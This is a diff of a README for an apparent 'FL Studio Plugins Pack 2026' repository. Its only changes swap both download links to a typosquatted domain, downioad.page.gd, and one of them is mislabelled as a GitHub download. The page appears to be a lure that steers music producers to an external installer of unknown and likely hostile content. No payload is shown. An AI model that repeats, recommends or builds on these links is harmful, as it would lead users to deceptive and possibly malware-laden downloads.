@@ -2,7 +2,7 @@
 
 Welcome to the FL Studio Plugins Pack 2026 repository! This project aims to provide a curated collection of plugins, skins, and templates specifically tailored for FL Studio users on Windows. Whether you're a music producer, beatmaker, or sound designer, this toolkit offers essential resources to elevate your workflow and creativity.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -74,7 +74,7 @@ A: Updates will be released quarterly or as needed, with new content and bug fix
 
 Ready to enhance your FL Studio experience? Download the latest version of the FL Studio Plugins Pack 2026 from the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 We encourage you to star the repository if you find it useful, and feel free to contribute through issues or suggestions. Your feedback helps improve the toolkit for everyone.
 
